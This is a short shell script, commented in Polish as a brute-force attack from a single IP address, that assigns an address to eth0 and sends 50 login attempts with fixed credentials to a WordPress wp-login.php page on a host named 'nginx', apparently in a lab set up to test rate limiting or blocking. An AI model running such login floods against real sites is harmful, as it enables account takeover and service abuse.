#!/bin/sh

# atak bf z jednego adresu IP

TARGET="http://nginx/wp-login.php"

ip addr add 10.11.4.254/16 dev eth0 2>/dev/null

i=1
while [ "$i" -le 50 ]; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --interface 10.11.4.254 --data "log=admin&pwd=haslo1" "$TARGET")
    echo "$i: $code"
    i=$((i + 1))
done

echo koniec ataku
